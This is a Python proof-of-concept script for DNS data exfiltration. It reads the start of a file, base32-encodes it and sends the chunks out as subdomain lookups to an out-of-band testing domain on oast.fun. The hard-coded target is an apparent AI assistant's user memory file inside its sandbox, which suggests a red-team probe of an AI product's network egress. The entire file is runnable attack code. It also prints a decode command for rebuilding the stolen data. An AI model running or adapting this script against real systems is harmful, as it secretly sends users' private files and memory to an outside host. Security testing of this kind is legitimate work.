import socket
import os
import base64
import time
import math


def advanced_dns_exfiltration_poc(file_path, target_domain, chunk_size=30, max_chunks_to_send=5):
    """
    Proof of Concept (PoC) demonstrating DNS-based data exfiltration through
    outbound DNS resolution.
    """

    print("=" * 80)
    print(" DNS DATA EXFILTRATION PROOF OF CONCEPT ")
    print("=" * 80)

    if not os.path.exists(file_path):
        print(f"[-] Error: Target file '{file_path}' was not found.")
        return

    file_size = os.path.getsize(file_path)
    print(f"[+] Target File: {file_path}")
    print(f"[+] File Size: {file_size} bytes")
    print("-" * 80)

    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            raw_data = f.read(150)

        if not raw_data.strip():
            print("[-] Error: File is empty or contains invalid data.")
            return

        print("[*] Sample Data Used for the Test:")
        print(f"\n{raw_data}\n")
        print("-" * 80)

        encoded_bytes = base64.b32encode(raw_data.encode("utf-8"))
        b32_string = encoded_bytes.decode("utf-8").lower()
        b32_clean = b32_string.replace("=", "")

        total_length = len(b32_clean)
        total_chunks = math.ceil(total_length / chunk_size)
        chunks = [b32_clean[i:i + chunk_size] for i in range(0, total_length, chunk_size)]

        print(f"[+] Base32 Length: {total_length} characters")
        print(f"[+] Total Chunks: {total_chunks}")
        print(f"[+] Chunks to Send: {min(total_chunks, max_chunks_to_send)}")
        print("-" * 80)

        print("[*] Verification Command:")
        print(" Join the Base32 chunks from the OAST logs and decode them with:\n")

        reconstruct_payload = "".join(chunks[:max_chunks_to_send])
        print(f' echo "{reconstruct_payload}" | tr \'[:lower:]\' \'[:upper:]\' | base32 -d')
        print("-" * 80)
        print("[*] Sending DNS Queries...\n")

        sent_count = 0

        for index, chunk in enumerate(chunks):
            if sent_count >= max_chunks_to_send:
                break

            constructed_subdomain = f"file-{index}-{chunk}.{target_domain}"
            print(f"[Request #{index:02d}] {constructed_subdomain}")

            try:
                socket.gethostbyname(constructed_subdomain)
            except socket.gaierror:
                pass

            sent_count += 1
            time.sleep(1.2)

        print("\n[+] Test Completed.")
        print(f"[!] Check the OAST logs for: {target_domain}")

    except Exception as error:
        print(f"[-] Error: {error}")

    print("=" * 80)


if __name__ == "__main__":

    TEST_FILE = "/home/workdir/.grok/user_info/memory.md"

    OAST_DOMAIN = "bwagflfxdadrowyvoodh0osbrq6pu96gq.oast.fun"

    advanced_dns_exfiltration_poc(
        file_path=TEST_FILE,
        target_domain=OAST_DOMAIN,
        chunk_size=30,
        max_chunks_to_send=5
    )
